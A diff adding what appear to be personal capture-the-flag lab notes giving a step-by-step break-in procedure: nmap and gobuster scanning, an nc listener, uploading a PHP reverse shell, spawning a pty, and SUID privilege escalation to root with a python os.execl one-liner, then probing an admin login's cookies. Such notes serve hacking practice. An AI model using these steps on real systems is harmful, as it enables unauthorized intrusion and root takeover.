@@ -1,0 +1,36 @@
+1. RUN AN NMAP PORTSCAN FORMAT= EITHER nmap -sC -Pn -oN  nmap/initial YOUR TARGET IP OR  nmap -sC -sV-oN  nmap/initial YOUR TARGET IP OR nmap -sC -p- -oN  nmap/all_ports 10.10.246.120
+2. RUN GOBUSTER: gobuster dir -u "IP/" -w /home/kali/Downloads/wordlist.txt AND TYR ALL DIRECTORIS TO FIND SECRET ONES THAT WASNT LISTED
+3. CHECK IF IT HAS SOMEWHERE TO UPLOAD FILES
+4. SET UP LISTENER -nc -nvlp 4444
+5. UPLOAD PHPREVERSE SHELL TO THE WEBSERVER
+6. click on the php reverse shell
+7 GO BACK TO YOUR TERMINAL AND ENTER ls
+8.THEN ENTER python -c 'import pty;pty.spawn ("/bin/bash")'
+8. THEN ENTER pwd and then whoami
+9.then ls 
+10. to find the directory you want access to search find / -type f -name the name 2>dev/null
+NOTE: to find the directory ANY you want access to search find / -type f -name the name 2>dev/null
+IF IT SHOWS PERMISSION DENIED TYPE cat
+
+TO GET ROOT ADMINISTRTAOR PRIVILLEGES
+1.TYPE    find / -type f -user root -perm -4000 2>dev/null
+2. then find a usr/bin/python or a programming language 
+3. go to GTFO BINS website AND TYPE python then type SUID  then look for -c 'import os; os.execl("/bin/sh", "sh", "-p")' and copy it if you saw python programming lang if not look for it there
+4.then type ./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+5. click enter 
+then type ls
+6. then type whoami to check if you are root if you are 
+7.then type cd root or check for important information
+
+
+
+OK WHEN YOU MANAGE TO GET AN ADMIN PAGE INSPECT ELEMENT
+1.INSPECT ELEMT CTRL Q
+2. TYPE ANY USERNAME AND PASSWORD THEN CHECK THE INSPECT ELEMENT 
+3. GO TO STACK TRACE AND SEE WHERE THE LOGIN DAT IS GOING TO
+4. SEARCH FOR ANY COOKIE SEGMENT
+5. IF YOU DONT UNDERSTAND GO TO THESE YOUTUBE VIDEOS
+
+https://www.youtube.com/watch?v=hpX6y5Rfz9I&t=208s
+https://www.youtube.com/watch?v=NGNnxD0gNDw&t=768s
+thos is for RSA KEY YOUTUBE VIDEO  https://www.youtube.com/watch?v=Q9ZfITlz2yk&t=236s
